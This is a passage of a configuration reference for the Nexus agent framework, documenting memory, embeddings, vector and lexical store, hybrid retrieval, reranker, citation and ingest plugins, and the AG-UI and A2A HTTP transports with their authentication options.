| `model_role`        | string | `quick`          | Role used for the compaction LLM call. |
| `model`             | string | *(none)*         | Explicit model ID. |
| `prompt`            | string | *(default)*      | Inline compaction prompt. |
| `prompt_file`       | string | *(none)*         | Path to a prompt file. |
| `protect_recent`    | int    | `4`              | Recent messages exempt from compaction. |
| `persist`           | bool   | `true`           | Persist snapshots and archives to the session workspace. |
| `require_approval.enabled`                    | bool     | `false`   | Emit `hitl.requested` before committing the summary back into history. Off = unchanged behavior. |
| `require_approval.default_choice`             | string   | *(none)*  | Choice ID picked when the deadline expires (e.g. `reject`). Empty = treat timeout as cancelled. |
| `require_approval.timeout`                    | duration | *(none)*  | Optional deadline (`5m`, `30s`, …). |
| `require_approval.match.size_threshold_bytes` | int      | *(any)*   | Only require approval when the summary is at least this many bytes. |

### `nexus.memory.longterm`

Source: `plugins/memory/longterm/plugin.go`. Provides `memory.longterm`.
Registers LLM tools: `memory_write`, `memory_read`, `memory_list`,
`memory_delete`.

| Key                     | Type   | Default            | Description |
|-------------------------|--------|--------------------|-------------|
| `scope`                 | string | `agent`            | `agent`, `global`, or `both`. |
| `path`                  | string | `~/.nexus/memory/` | Base directory for memory files. |
| `agent_id`              | string | *(auto)*           | Agent identifier when `scope` includes `agent`. |
| `auto_load`             | bool   | `true`             | Load memory index at startup and inject into the system prompt. |
| `auto_save_instructions`| string | *(none)*           | Instructions appended to the system prompt (e.g. "save important decisions"). |
| `require_approval.enabled`                    | bool     | `false`   | Emit `hitl.requested` before persisting writes. Off by default; on = every write blocks until an operator responds. |
| `require_approval.default_choice`             | string   | *(none)*  | Choice ID picked when the deadline expires (e.g. `reject`). Empty = treat timeout as cancelled. |
| `require_approval.timeout`                    | duration | *(none)*  | Optional deadline (`5m`, `30s`, …). |
| `require_approval.match.key_glob`             | string   | *(any)*   | Only require approval when the entry key matches this glob. |
| `require_approval.match.size_threshold_bytes` | int      | *(any)*   | Only require approval when the content is at least this many bytes. |

### `nexus.memory.vector`

Source: `plugins/memory/vector/plugin.go`. Provides `memory.vector`. Requires
`embeddings.provider` and `vector.store`.

| Key                     | Type   | Default                | Description |
|-------------------------|--------|------------------------|-------------|
| `namespace`             | string | `memory-{instanceID}`  | Vector store namespace. |
| `top_k`                 | int    | `5`                    | Recalled matches per query. |
| `min_similarity`        | float  | `0.0`                  | Minimum cosine similarity (0 disables filtering). |
| `auto_store_compaction` | bool   | `true`                 | Store summaries when `memory.compacted` fires. |
| `auto_store_user_input` | bool   | `false`                | Store user messages on every input (opt-in). |
| `section_priority`      | int    | `45`                   | Priority of the recalled-memory section in the system prompt. |
| `recall_via_hybrid`     | bool   | `false`                | When `search.hybrid` is active, route recall queries through it instead of direct vector lookup. Off by default — adds the lexical leg's latency to every user input. |
| `store_images`          | bool   | `false`                | Embed image attachments on `UserInput.Files` (any `MimeType` starting with `image/`) via the multimodal `embeddings.provider` and store the resulting vector under `image_namespace`. Requires a multimodal adapter (e.g. `nexus.embeddings.cohere_multimodal`); text-only adapters will reject and the path no-ops. Off by default — opt-in. |
| `image_namespace`       | string | `<namespace>-images`   | Vector store namespace for image embeddings. Kept separate from the text namespace so similarity queries can target one or the other. |
| `require_approval.enabled`                    | bool     | `false`   | Emit `hitl.requested` before each `vector.upsert`. Off = unchanged behavior. |
| `require_approval.default_choice`             | string   | *(none)*  | Choice ID picked when the deadline expires (e.g. `reject`). Empty = treat timeout as cancelled. |
| `require_approval.timeout`                    | duration | *(none)*  | Optional deadline (`5m`, `30s`, …). |
| `require_approval.match.namespace_glob`       | string   | *(any)*   | Only require approval when the configured `namespace` matches this glob. |
| `require_approval.match.size_threshold_bytes` | int      | *(any)*   | Only require approval when the document content is at least this many bytes. |

### `nexus.memory.tool_result_clear`

Source: `plugins/memory/tool_result_clear/plugin.go`. Live curator that
replaces stale tool-result bodies in outgoing `LLMRequest.Messages` with an
inline `<tool_result … cleared="true" …/>` envelope. The original
call/result pairing stays in history so the agent retains the fact of the
call. Runs at priority 12 on `before:llm.request` (after
`nexus.discovery.progressive`).

| Key                    | Type     | Default                          | Description |
|------------------------|----------|----------------------------------|-------------|
| `enabled`              | bool     | `true`                           | Toggle the curator. |
| `age_turns`            | int      | `5`                              | Clear tool results older than this many turns when also exceeding the size threshold. |
| `size_bytes_threshold` | int      | `1000`                           | Skip clearing for result bodies smaller than this many bytes. |
| `preserve_recent_kinds`| []string | `["error", "user_question"]`     | Result kinds that are never cleared regardless of age. |
| `drop_strategy`        | string   | `replace_with_envelope`          | `replace_with_envelope` keeps the call/result pair with a marker body; `full_drop` removes the message entirely (risks tool_use/tool_result pairing breakage). |

Emits `memory.tool_result_cleared` (per cleared call) and `memory.curated`
(stability descriptor for the cache-aware prompt builder).

### `nexus.memory.tool_def_pruner`

Source: `plugins/memory/tool_def_pruner/plugin.go`. Drops individual tool
definitions from outgoing `LLMRequest.Tools` when they have been idle past
`unused_turns_threshold`. Pairs with `nexus.discovery.progressive` —
progressive scopes by class, this scopes per tool. Runs at priority 14 on
`before:llm.request`.

| Key                      | Type     | Default                  | Description |
|--------------------------|----------|--------------------------|-------------|
| `enabled`                | bool     | `true`                   | Toggle the pruner. |
| `unused_turns_threshold` | int      | `6`                      | Drop a tool definition after this many consecutive turns without an invocation. |
| `never_prune`            | []string | `["discover","ask_user"]`| Tool names exempt from pruning (e.g. discovery's meta-tool, HITL ask-user). |

Emits `memory.tool_def_pruned` and `memory.curated`. The `MemoryCurated`
event marks `cache_invalidates: true` because the tool list is part of the
session-cached prefix.

### `nexus.memory.topic_pruner`

Source: `plugins/memory/topic_pruner/plugin.go`. Detects topic boundaries
in user input and emits `memory.topic_shift_detected`. Two signals are
combined:

- Explicit-phrase matching ("different question", "new topic", "let's
  move on", …) — cheap, deterministic.
- Embedding similarity drop against the rolling topic centroid — runs only
  when an `embeddings.provider` is active.

The plugin does not itself rewrite history; it surfaces the shift so other
plugins (summary buffer, compaction) can react. Topic boundaries are
journalled for replay determinism.

| Key                    | Type     | Default                                 | Description |
|------------------------|----------|-----------------------------------------|-------------|
| `enabled`              | bool     | `true`                                  | Toggle the pruner. |
| `similarity_threshold` | float    | `0.55`                                  | Cosine similarity below which a new user input flags a topic shift. Used only when an `embeddings.provider` is active. |
| `keep_last_topic_full` | bool     | `true`                                  | Reserved — informs downstream consumers whether the most recent topic should remain verbatim. |
| `explicit_phrases`     | []string | `["different question", "different topic", "new topic", "new question", "let's move on", "moving on", "change of subject", "switching gears", "unrelated:", "separately,", "on a different note"]` | Lowercase substrings that signal a topic shift. Replacing the list disables the defaults. |

Emits `memory.topic_shift_detected` and `memory.curated`. Same-turn
duplicate signals are debounced.

---

## Embeddings

### `nexus.embeddings.openai`

Source: `plugins/embeddings/openai/plugin.go`. Provides `embeddings.provider`.

| Key            | Type     | Default                                  | Description |
|----------------|----------|------------------------------------------|-------------|
| `api_key`      | string   | *(required, or via env)*                 | OpenAI API key. |
| `api_key_env`  | string   | `OPENAI_API_KEY`                         | Override env var name. |
| `base_url`     | string   | `https://api.openai.com/v1/embeddings`   | Endpoint (Azure / OpenAI-compatible proxies). |
| `model`        | string   | `text-embedding-3-small`                 | Default model. |
| `timeout`      | duration | `30s`                                    | HTTP timeout. |

### `nexus.embeddings.mock`

Source: `plugins/embeddings/mock/plugin.go`. Provides `embeddings.provider`.
Deterministic hash-based vectors; opt-in via `plugins.active`.

| Key          | Type   | Default          | Description |
|--------------|--------|------------------|-------------|
| `dimensions` | int    | `128`            | Vector dimensionality. |
| `model`      | string | `mock-embedding` | Model ID string returned to callers. |

### `nexus.embeddings.cohere_multimodal`

Source: `plugins/embeddings/cohere_multimodal/plugin.go`. Provides
`embeddings.provider` via Cohere Embed v3 (`POST /v2/embed`). Multimodal:
accepts text and image inputs in a single batch through
`EmbeddingsRequest.Inputs`. Opt-in: registered but **not** in the default
`plugins.active` list — wire it explicitly when image embeddings are
required (e.g. `nexus.memory.vector` with `store_images: true`).

For an `EmbeddingsInput` carrying `ImageURI` with the `nexus-blob:`
scheme, the plugin resolves bytes via the per-session blob store. When
the engine boots without a session (rare, mostly tests), the plugin
errors clearly — callers must inline bytes via `EmbeddingsInput.Image`
instead.

| Key            | Type     | Default                       | Description |
|----------------|----------|-------------------------------|-------------|
| `api_key`      | string   | *(required, or via env)*      | Cohere API key. |
| `api_key_env`  | string   | `COHERE_API_KEY`              | Override env var name. |
| `base_url`     | string   | `https://api.cohere.com`      | Cohere API base URL. The plugin appends `/v2/embed` itself. |
| `model`        | string   | `embed-english-v3.0`          | Cohere embedding model. |
| `input_type`   | string   | `search_document`             | Cohere `input_type` (e.g. `search_document`, `search_query`, `classification`, `clustering`, `image`). |
| `timeout`      | duration | `30s`                         | HTTP timeout. |

---

## Vector store

### `nexus.vectorstore.chromem`

Source: `plugins/vectorstore/chromem/plugin.go`. Provides `vector.store`.

| Key        | Type   | Default          | Description |
|------------|--------|------------------|-------------|
| `path`     | string | `~/.nexus/vectors` | Directory for persistent storage (one subdir per namespace). |
| `compress` | bool   | `false`          | Gzip-compress JSON on disk. |

---

## Lexical store

### `nexus.vectorstore.sqlite_fts`

Source: `plugins/vectorstore/sqlite_fts/plugin.go`. Provides `search.lexical`.
BM25 ranking via SQLite FTS5 — pure Go, no CGO. Backing storage comes from
the engine's per-plugin storage capability; the `scope:` knob picks where the
underlying `store.db` lands.

| Key      | Type   | Default   | Description |
|----------|--------|-----------|-------------|
| `scope`  | string | `session` | Storage scope for the FTS index: `session`, `agent`, `app`. Knowledge-base-style corpora that survive across sessions should use `agent` or `app`. |

Each namespace becomes a separate FTS5 virtual table (`lex_<safe_namespace>`)
inside the scoped `store.db`. The provider auto-creates tables on first
upsert; missing-namespace queries return zero results without error.

---

## RAG

### `nexus.rag.hybrid`

Source: `plugins/rag/hybrid/plugin.go`. Provides `search.hybrid` — a fusion
orchestrator that runs vector + lexical retrieval in parallel and combines
results via Reciprocal Rank Fusion or weighted score combination.

| Key                | Type   | Default | Description |
|--------------------|--------|---------|-------------|
| `fusion`           | string | `rrf`   | Fusion strategy: `rrf` (rank-only, weight-free) or `weighted` (linear combination over min-max-normalized per-backend scores). |
| `rrf_k`            | int    | `60`    | RRF smoothing constant. Lower values weight top ranks more heavily. |
| `weights.vector`   | float  | `0.7`   | Per-backend bias for `weighted` fusion. |
| `weights.lexical`  | float  | `0.3`   | Per-backend bias for `weighted` fusion. |
| `retrieve_k`       | int    | `50`    | Per-backend candidate count gathered before fusion. |
| `fuse_to`          | int    | `20`    | Default post-fusion top-N when the caller does not specify K. |
| `reranker.enabled` | bool   | `false` | Apply a post-fusion reranker pass via the `search.reranker` capability. Off by default — enable when a reranker provider is active and the latency budget allows. |

Requires `embeddings.provider`, `vector.store`, and `search.lexical`. Per-query
`LexicalBias` (range -1..1) on the `hybrid.query` event tilts fusion weights
without rewriting config — positive favors lexical, negative favors vector.

When `search.hybrid` is active, `nexus.tool.knowledge_search` automatically
routes through it instead of querying the vector store directly.
`nexus.memory.vector` opts in via `recall_via_hybrid: true` (off by default
because the lexical leg adds latency on every user input).

---

### Rerankers (`search.reranker` capability)

Three providers ship; activate one (rarely more than one). The hybrid
orchestrator's `reranker.enabled: true` knob switches them on; without that,
plugins can still emit `reranker.rerank` events directly.

#### `nexus.rag.reranker.cohere`

Source: `plugins/rag/reranker/cohere/plugin.go`. Cohere Rerank v2 API.

| Key            | Type   | Default                | Description |
|----------------|--------|------------------------|-------------|
| `api_key`      | string | *(none)*               | Cohere API key. Mutually exclusive with `api_key_env`. |
| `api_key_env`  | string | `COHERE_API_KEY`       | Env var to read the key from when `api_key` is unset. |
| `model`        | string | `rerank-english-v3.0`  | Cohere reranker model identifier. |
| `timeout_ms`   | int    | `10000`                | HTTP timeout in milliseconds. |
| `api_base`     | string | *(Cohere v2 endpoint)* | Override for testing / private deployments. |

#### `nexus.rag.reranker.jina`

Source: `plugins/rag/reranker/jina/plugin.go`. Jina AI Reranker API.

| Key            | Type   | Default                                   | Description |
|----------------|--------|-------------------------------------------|-------------|
| `api_key`      | string | *(none)*                                  | Jina API key. Mutually exclusive with `api_key_env`. |
| `api_key_env`  | string | `JINA_API_KEY`                            | Env var to read the key from when `api_key` is unset. |
| `model`        | string | `jina-reranker-v2-base-multilingual`      | Jina reranker model identifier. |
| `timeout_ms`   | int    | `10000`                                   | HTTP timeout in milliseconds. |
| `api_base`     | string | *(Jina v1 endpoint)*                      | Override for testing / private deployments. |

#### `nexus.rag.reranker.local`

Source: `plugins/rag/reranker/local/plugin.go`. Pure-Go TF-IDF cosine
reranker. No API calls, no model files, no extra dependencies. Quality is
materially below a real cross-encoder; use it for offline / cost-sensitive
deployments and as the zero-dep fallback. Future phase will add an ONNX-
backed BGE Reranker behind a build tag.

| Key                  | Type | Default | Description |
|----------------------|------|---------|-------------|
| `min_token_length`   | int  | `2`     | Drop tokens shorter than this during scoring. |
| `disable_stopwords`  | bool | `false` | Skip the built-in English stopword filter. |

---

### `nexus.rag.citations`

Source: `plugins/rag/citations/plugin.go`. Provides `rag.citations`. Parses
citation tags or Anthropic-native source attributions out of LLM responses
and emits the structured `llm.response.cited` event for IO renderers to
footnote.

| Key                | Type   | Default | Description |
|--------------------|--------|---------|-------------|
| `mode`             | string | `auto`  | Citation source: `tag` (parses `<cite source="..." chunk="N"/>` markers), `anthropic_native` (reads `LLMResponse.Citations[]` populated by Anthropic), or `auto` (uses native when present, falls back to tag). |
| `strict`           | bool   | `true`  | When true, citations whose `(source, chunk)` does not match a chunk recorded in the current turn's retrieval context are dropped. When false, they are kept and tagged with `TrustTier="unverified"`. |
| `section_priority` | int    | `60`    | Priority of the citation-contract section in the system prompt (only used in tag/auto modes). |

Subscribes to `rag.retrieved` (emitted by `nexus.tool.knowledge_search` and
`nexus.memory.vector`) to build the per-turn validation set, then to
`llm.response` to do the parsing. Emits `llm.response.cited`.

---

### `nexus.rag.ingest`

Source: `plugins/rag/ingest/plugin.go`. Backs the `nexus ingest` CLI subcommand
and the `rag.ingest` event handler.

| Key                   | Type | Default                    | Description |
|-----------------------|------|----------------------------|-------------|
| `chunker.size`        | int  | `1000`                     | Characters per chunk. |
| `chunker.overlap`     | int  | `200`                      | Character overlap between chunks. |
| `cache_dir`           | string | `~/.nexus/vectors/_cache` | Embedding cache directory (hash → vector). The contextual-prefix cache lands at `<cache_dir>/_prefix/`. |
| `backfill`            | bool | `true`                     | Walk watched directories at startup and ingest pre-existing files. |
| `watch`               | list | *(empty)*                  | File watch entries; each is `{path, glob, namespace}`. |
| `watch[].path`        | string | *(required)*             | Directory to watch. |
| `watch[].glob`        | string | *(empty — match all)*    | Glob pattern for files to ingest. |
| `watch[].namespace`   | string | *(required)*             | Vector store namespace. |
| `contextual_retrieval.enabled`              | bool   | `false`                    | Per-chunk LLM-generated situating prefix (Anthropic contextual retrieval). Adds one LLM call per uncached chunk during ingest; ~49% reported recall improvement. Stored content stays the raw chunk; only the embed/lexical text is prefixed. |
| `contextual_retrieval.model_role`           | string | *(role default)*           | Model role used for prefix generation (resolved via `core.models`). |
| `contextual_retrieval.max_chars_doc_window` | int    | `2000`                     | Max characters of surrounding document context handed to the LLM. |
| `contextual_retrieval.max_chars_prefix`     | int    | `400`                      | Truncate generated prefix to this many characters before concatenation. |
| `contextual_retrieval.timeout_ms`           | int    | `30000`                    | Per-call timeout. On timeout the prefix is dropped and the raw chunk is used. |

Requires `embeddings.provider` and `vector.store`. When `search.lexical` is
also active, ingest dual-writes each chunk into the lexical store with the
same `(namespace, doc_id)` pair the vector store uses.

To migrate an existing chromem-only corpus to dual-mode: add
`nexus.vectorstore.sqlite_fts` to `plugins.active` and re-run
`nexus ingest --lexical=true PATH`. The embedding cache short-circuits the
vector pass while the lexical store is freshly populated.

---

## I/O

### `nexus.io.tui`

Source: `plugins/io/tui/plugin.go`. **No configuration.** Bubble Tea terminal UI.

### `nexus.io.browser`

Source: `plugins/io/browser/plugin.go`.

| Key            | Type   | Default     | Description |
|----------------|--------|-------------|-------------|
| `host`         | string | `localhost` | HTTP listen address. |
| `port`         | int    | `8080`      | HTTP listen port. |
| `open_browser` | bool   | `true`      | Auto-open the browser tab on startup (no-op when the OS lacks an opener). |

### `nexus.io.agui`

Source: `plugins/io/agui/plugin.go`. AG-UI ("Agent-User Interaction") serve
transport. Clients `POST` a `RunAgentInput` to `/agui` and receive a
`text/event-stream` SSE response (one stream per run), using the pkg/agui wire
format rather than the browser/wails Envelope. Safe by default: binds loopback,
optional bearer-token auth, and configurable CORS for browser AG-UI clients.

| Key                | Type         | Default            | Description |
|--------------------|--------------|--------------------|-------------|
| `bind`             | string       | `127.0.0.1:8090`   | `host:port` the HTTP listener binds to. Defaults to loopback so the endpoint is not network-exposed without explicit opt-in. |
| `bearer_token`     | string       | *(empty)*          | Inline bearer token. When set (and non-empty), `Authorization: Bearer <token>` is required on every request. Takes precedence over `bearer_token_env`. Mutually exclusive with `auth`. |
| `bearer_token_env` | string       | *(empty)*          | Name of an environment variable to read the bearer token from. Used only when `bearer_token` is empty. Mutually exclusive with `auth`. |
| `auth`             | map          | *(absent)*         | Optional validator-chain block, parsed by the **same** `pkg/nexusauth` parser the session broker uses — so `static`, `jwks`, `introspect` and `proxy_headers` are all available here. Absent means authentication is decided by `bearer_token`/`bearer_token_env` alone. See [Authentication (`auth:`) on `nexus.io.agui`](#authentication-auth-on-nexusioagui) below. |
| `cors_origins`     | string or list<string> | *(empty)* | Allowed CORS origins for browser clients. A single `*` echoes any request Origin; an explicit list echoes only matching origins. Empty means no CORS header (same-origin only), the safe default for a loopback listener. Accepts a YAML list **or** a single comma-separated string (`"https://a.example, https://b.example"`); both are trimmed and empty entries dropped. |
| `emit_state`       | bool         | `false`            | Opt-in AG-UI shared-state emission. When `true`, the transport mirrors the session's scene store (`nexus.scene`) as an AG-UI shared-state document and emits a `StateSnapshot` at run start plus ordered `StateDelta` events (RFC 6902 JSON Patch) as scenes mutate. Off by default because it adds scene-event subscriptions and per-mutation diffing overhead most clients do not need. Requires the `nexus.scene` plugin to be active to produce any state. |

**Schema-validated at boot.** The plugin ships `plugins/io/agui/schema.json` and
implements `ConfigSchema()`, so the engine validates this block — including
everything under `auth:` — **before `Init` runs**, with
`additionalProperties: false` at every object level. A misspelled key aborts the
boot naming the offender (`unknown key "bearer_tokn" (did you mean
"bearer_token"?)`) instead of being silently ignored, which for an auth key
would mean an unauthenticated listener and no warning. The table above is the
whole surface: any key not listed is rejected.

One rule is deliberately **not** in the schema. `auth:` versus
`bearer_token`/`bearer_token_env` is enforced in `Init` (see below), which owns
the operator-facing message; duplicating it in JSON Schema would give two
enforcement points that can drift, and the schema one runs first and would
report the worse message.

**Round-trip:** a `POST /agui` maps the request `messages` to a Nexus
`io.input` (the trailing `user` message drives the turn; earlier messages ride
as `PreloadMessages`; `threadId` is recorded as the session id, `runId`
identifies the turn). The plugin subscribes to the same bus events as the
browser transport and translates them to canonical AG-UI SSE:
`agent.turn.start`→`StepStarted`, `llm.stream.chunk`→`TextMessage*`,
`tool.call`/`tool.result`→`ToolCall*`, `thinking.step`→`Reasoning*`,
`agent.turn.end`→`StepFinished`/`RunFinished`. The stream flushes incrementally
and terminates at `RunFinished` (or `RunError` on failure/disconnect).

**Non-canonical events:** Nexus bus events with no canonical AG-UI equivalent
(`workflow.progress`, `subagent.started`/`iteration`/`complete`,
`code.exec.stdout`) consistently ride the AG-UI `Custom` event, with `name` set
to the bus event type and `value` the JSON-encoded payload. This is a
documented superset — conformance clients that only understand canonical events
can ignore `Custom` without losing the run's canonical lifecycle.

**Scope:** one in-flight run per listener (single engine/session per listener,
mirroring `nexus.io.browser`). A second `POST` while a run is active receives a
terminal `RunStarted`+`RunError` stream rather than interleaving.

**Shared state (`emit_state: true`):** the transport tracks the scene store's
`scene.created` / `scene.patched` / `scene.deleted` bus events (each carrying the
scene's full post-mutation content) into a shared-state document keyed by
`scene_id`. A `StateSnapshot` of the current document is emitted immediately
after `RunStarted`; each subsequent scene mutation during the run emits a
`StateDelta` whose `delta` is an RFC 6902 JSON Patch from the prior document to
the new one, so a client applying the deltas in order reconstructs the snapshot.
The document is session-scoped and persists across runs on the listener (a later
run's snapshot reflects scenes created earlier). Inbound state
(`RunAgentInput.state`, same scene-keyed shape) is applied at run start — and on
a resume/continuation run — **before** the initial `StateSnapshot`, seeding the
scene store via a `scene_create` `tool.invoke` per scene so the agent observes it
through `scene_get` / `scene_list`. Conflict semantics are
client-state-seeds-then-agent-wins: the client seed lands before the agent's
first turn, then agent-side `scene_patch` mutations are last-writer and flow back
out as `StateDelta`. See
[Shared state](../plugins/io-agui.md#shared-state).

#### Authentication (`auth:`) on `nexus.io.agui`

The transport authenticates through the shared identity layer (`pkg/nexusauth`)
— the same validator chain the [session broker](#authentication-auth) uses. Two
spellings are accepted and they are **mutually exclusive**:

- `bearer_token` / `bearer_token_env` — one shared secret, unchanged and **not
  deprecated**. It is desugared into a one-entry `static` validator, which is
  purely an implementation detail with one visible improvement: the token
  comparison is now constant-time.
- `auth:` — the full validator-chain block, so an AG-UI deployment can verify
  OIDC JWTs (`jwks`), opaque tokens (`introspect`), or an identity a fronting
  proxy established (`proxy_headers`).

Setting **both** is a **boot error** naming both keys, not a precedence rule:
two sources for one security decision means one of them is stale, and quietly
preferring either is how an operator comes to believe a credential was tightened
when it was not. (Setting `bearer_token` *and* `bearer_token_env` remains legal
and keeps its original precedence — inline first, then the environment
variable.)

Setting neither means **authentication is disabled** and every request is
admitted, exactly as before. That is safe by default only because the listener
binds loopback; change `bind` and you should configure auth in the same commit.

```yaml
plugins:
  nexus.io.agui:
    bind: "0.0.0.0:8090"
    auth:
      validators:            # ordered; the first validator that accepts wins
        - type: static       # a shared token for CI or a local operator CLI
          tokens:
            - token: "..."
              principal: "ci-runner"
        - type: jwks         # OIDC JWTs verified against the issuer's published keys
          issuer: "https://id.example.com/"
          jwks_url: "https://id.example.com/.well-known/jwks.json"
          audience: "nexus-agui"
          principal_claim: sub
```

**The validator keys are identical to the broker's** — `validators[].type`,
`principal_claim`, `tokens[]`, `issuer`/`jwks_url`/`audience`, the `introspect`
keys, the `proxy_headers` keys, and their defaults and validation rules are all
documented once under [Authentication (`auth:`)](#authentication-auth) and the
per-validator sections that follow it. There is one deliberate difference:
`auth.admin_scope` is **broker-only** and is rejected here as an unknown key.
Unknown keys are rejected at every level in both hosts — a silently ignored auth
key is a security bug, not a cosmetic one.

On this host they are rejected **twice over**, and the earlier of the two is the
one an operator meets: `plugins/io/agui/schema.json` describes every validator
key per `type`, so a key that belongs to a different validator type (`jwks_url`
on a `static` entry) or a duration written as a bare number (`cache_ttl: 600`)
fails at boot before `pkg/nexusauth` ever parses the block. The two agree by
construction — the schema was derived from the `nexusauth` parsers, not from
prose — and `nexusauth` remains the authority for the rules a schema cannot
express (URL transport, algorithm confusion, duplicate tokens, TTL caps).

**Gated surface.** `POST /agui` only. `OPTIONS /agui` (CORS preflight) is
deliberately **not** authenticated: a browser never attaches `Authorization` to a
preflight, so gating it would make every cross-origin AG-UI client unable to
reach the endpoint it is authorized for. CORS headers are applied **before** the
auth check so a browser can actually read a `401` instead of seeing an opaque
network error.

**Status mapping.** Denials are classified by the chain, never by string
matching, and map onto:

| Situation                                           | Status | Body                                     | Headers |
|-----------------------------------------------------|--------|------------------------------------------|---------|
| No `Authorization: Bearer` header                   | `401`  | `unauthorized`                           | `WWW-Authenticate: Bearer realm="nexus-agui"` |
| Credential presented and rejected                   | `401`  | `unauthorized`                           | `WWW-Authenticate: Bearer realm="nexus-agui", error="invalid_token"` |
| Credential valid but lacking the required authority  | `403`  | `insufficient scope`                     | `WWW-Authenticate: Bearer realm="nexus-agui", error="insufficient_scope"` |
| The validator could not reach a verdict              | `503`  | `authentication temporarily unavailable` | `Retry-After: 5` (deliberately **no** `WWW-Authenticate`) |

The codes match the broker's because the denial kinds are the shared package's
transport contract, and one deployment should not answer the same refusal two
different ways. The **bodies** differ: this endpoint's success response is an SSE
stream, not JSON, so there is no envelope for an error to be consistent with, and
the `401` body stays the plain `unauthorized` it has always been. The RFC 6750
challenge matters more here than on the broker — an AG-UI client is often a
browser front-end whose only structured signal is the status plus the challenge,
and `error="invalid_token"` is what lets it tell "sign in" from "refresh the
token" without parsing prose.

**Principal.** A resolved `Principal` is carried to the run and recorded on the
`agui run started` log record (`principal_id`); it is empty when auth is
disabled. Nothing keys behaviour on it yet — this transport serves a single
engine/session per listener and admits one run at a time, so there is no second
principal for an authorization decision to distinguish.

### `nexus.io.a2a`

Source: `plugins/io/a2a/`. Agent2Agent (A2A) **serve** transport: exposes this
Nexus instance as an A2A agent over one HTTP listener carrying three surfaces —
the `/.well-known/agent-card.json` discovery document, the JSON-RPC 2.0 binding,
and the HTTP+JSON/REST binding. The wire format is `pkg/a2a` (A2A specification
1.0.x); this plugin contributes the listener, the credential guard, the card
assembly and the routing. Safe by default: binds loopback, optional auth through
the shared `pkg/nexusauth` chain, and CORS off unless configured. The
[A2A Interoperability guide](../guides/a2a.md) covers the protocol mapping and a
worked end-to-end example; [`nexus.io.a2a`](../plugins/io/a2a.md) is the plugin
page.

> **Maturity.** Every A2A operation outside the push-notification family is
> wired. `SendMessage` and `SendStreamingMessage` drive a real Nexus turn; every
> task they create is **persisted durably** (see [Task retention](#task-retention)
> below) and `GetTask`, `ListTasks` and `SubscribeToTask` read it back — see
> [Reading tasks](#reading-tasks) below. A task interrupted by a
> human-in-the-loop question parks at `TASK_STATE_INPUT_REQUIRED` and is resumed
> by a message naming the same `taskId`, and `CancelTask` settles a task at
> `TASK_STATE_CANCELED` — see
> [Interruption and cancellation](#interruption-and-cancellation) below. The
> Agent Card reports all of this honestly: `capabilities.streaming` is `true`
> because both streaming operations are wired, while `pushNotifications` and
> `extendedAgentCard` are `false`. (A2A declares no capability boolean for
> cancellation; it is part of the core task surface.) A turn publishes its final
> text, its structured output, **every** tool result and every file it wrote as
> Artifacts, and the card declares the Nexus telemetry extension — see
> [Artifacts](#artifacts) and [The Nexus extension](#the-nexus-extension) below.

| Key                     | Type         | Default              | Description |
|-------------------------|--------------|----------------------|-------------|
| `bind`                  | string       | `127.0.0.1:8091`     | `host:port` the HTTP listener binds to. Loopback by default so the endpoint is not network-exposed without explicit opt-in. An empty string falls back to the default. |
| `public_url`            | string       | `http://<bind>`      | Absolute base URL advertised in the card's `supportedInterfaces`. The default is right for the loopback bind and wrong the moment a reverse proxy is involved — set it to the externally reachable origin whenever `bind` is not what clients dial. A trailing `/` is trimmed. |
| `jsonrpc_path`          | string       | `/a2a`               | Absolute path the JSON-RPC 2.0 binding is mounted at (`POST` only). Must differ from `rest_prefix`; a relative path or a collision is a boot error. |
| `rest_prefix`           | string       | `/a2a/v1`            | Absolute path prefix the HTTP+JSON/REST binding is mounted under; the operation paths of A2A specification §11.3 (`/message:send`, `/tasks/{id}`, `/tasks/{id}:cancel`, …) hang off it. Must differ from `jsonrpc_path`. |
| `strict_version_header` | bool         | `false`              | How an **absent** `A2A-Version` service parameter is read. See [A2A version negotiation](#a2a-version-negotiation) below. |
| `card_requires_auth`    | bool         | `false`              | Whether `GET /.well-known/agent-card.json` is gated by the validator chain. See [Agent Card auth posture](#agent-card-auth-posture) below. |
| `cors_origins`          | string or list<string> | *(empty)*  | Allowed CORS origins. A single `*` echoes any request Origin; an explicit list echoes only matching origins. Empty means no CORS header at all (same-origin only). Accepts a YAML list **or** a single comma-separated string. |
| `bearer_token`          | string       | *(empty)*            | Inline bearer token, desugared into a one-entry `static` validator. Takes precedence over `bearer_token_env`. Mutually exclusive with `auth`. |
| `bearer_token_env`      | string       | *(empty)*            | Name of an environment variable holding the bearer token. Used only when `bearer_token` is empty. Mutually exclusive with `auth`. |
| `auth`                  | map          | *(absent)*           | Validator-chain block, parsed by the **same** `pkg/nexusauth` parser the session broker and `nexus.io.agui` use, so `static`, `jwks`, `introspect` and `proxy_headers` are all available. The card's `securitySchemes` are derived from it — see [Agent Card security](#agent-card-security-schemes) below. Every rule documented under [Authentication (`auth:`)](#authentication-auth) applies verbatim; `auth.admin_scope` is broker-only and is rejected here. |
| `card`                  | map          | *(absent)*           | The hand-authored Agent Card. Exactly one of `card` or `card_file` is **required**. See [Agent Card content](#agent-card-content) below. |
| `card_file`             | string (path)| *(absent)*           | Path to a JSON file holding a complete A2A Agent Card document (camelCase wire shape). Expanded through `engine.ExpandPath`, so `~` and `~/...` work. Mutually exclusive with `card`. |
| `tasks`                 | map          | *(absent)*           | Retention policy for the durable task store. Both knobs have non-zero defaults; see [Task retention](#task-retention) below. |
| `artifacts`             | map          | *(absent)*           | What a turn publishes as Artifacts, and the caps that bound it. Every knob has a non-zero default; see [Artifacts](#artifacts) below. |

**Schema-validated at boot.** The plugin ships `plugins/io/a2a/schema.json` and
implements `ConfigSchema()`, so the engine validates this block — including
everything under `auth:` and `card:` — **before `Init` runs**, with
`additionalProperties: false` at every object level. The schema also enforces
that one of `card`/`card_file` is present. The table above is the whole
top-level surface; any key not listed is rejected.

#### Running a turn

A `SendMessage` or `SendStreamingMessage` becomes one Nexus turn, reported as
one A2A Task. There is no configuration for any of this; it is the fixed
behaviour of the transport.

| A2A | Nexus |
|---|---|
| The message's text parts | `before:io.input` (vetoable, so the same gates that see a TUI keypress see this) then `io.input` |
| Task created `SUBMITTED` | the request is accepted |
| Task `WORKING` | `agent.turn.start` |
| Artifact with a text Part | the turn's final assistant text, taken from `io.output` (or the terminal `llm.response` when no output was published) |
| An extra `application/json` Part on that artifact | the same text when it is a JSON document — see [Artifacts](#artifacts) |
| One Artifact per tool result | every `tool.result`, unconditionally |
| One Artifact per written file | a path a `tool.result` reported writing |
